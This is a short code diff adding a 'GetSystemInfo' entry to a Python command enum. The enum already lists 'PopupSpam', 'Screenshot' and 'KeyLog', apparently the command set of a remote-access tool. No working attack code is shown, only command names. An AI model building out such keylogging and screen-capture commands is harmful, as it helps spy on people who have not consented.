@@ -9,6 +9,7 @@ class CommandType(str, enum.Enum):
     PopupSpam = "PopupSpam"
     Screenshot = "Screenshot"
     KeyLog = "KeyLog"
+    GetSystemInfo = "GetSystemInfo"
 
 
 class BasicCommand(BaseModel):
